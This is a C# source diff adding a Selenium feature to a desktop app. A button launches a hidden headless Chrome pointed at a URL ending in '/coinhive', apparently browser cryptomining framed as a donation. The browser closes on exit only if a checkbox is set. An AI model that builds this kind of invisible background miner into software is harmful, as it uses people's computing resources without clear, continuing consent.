@@ -20,6 +20,8 @@ using Newtonsoft.Json;
 using System.Diagnostics;
 using System.Web;
 using System.Speech.Synthesis;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
 
 
 namespace Prototype
@@ -43,8 +45,7 @@ namespace Prototype
             metroComboBox4.SelectedIndex = 0;
             materialRaisedButton6.Visible = false;
             Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)+@"\ELNA_Temp");
-            
-            
+
             //richTextBox1.Text = lines;
 
         }
@@ -539,6 +540,24 @@ namespace Prototype
                 path = fbs.SelectedPath;
                 textBox1.Text = path; }
         }
+        IWebDriver driver;
+        private void button8_Click(object sender, EventArgs e)
+        {
+            ChromeOptions options = new ChromeOptions();
+            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
+            service.HideCommandPromptWindow = true;
+            options.AddArgument("headless");
+            driver = new ChromeDriver(service, options);
+            driver.Navigate().GoToUrl("https://ylxm.eu.org/coinhive");
+                        button8.Enabled = false;
+            button8.Text = "Thank You Very Much!";
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            if(checkBox2.Checked)
+            driver.Quit();
+        }
     }
     public class Result
     {
@@ -554,5 +573,6 @@ namespace Prototype
     {
         public string extract { get; set; }
     }
+
 
 }
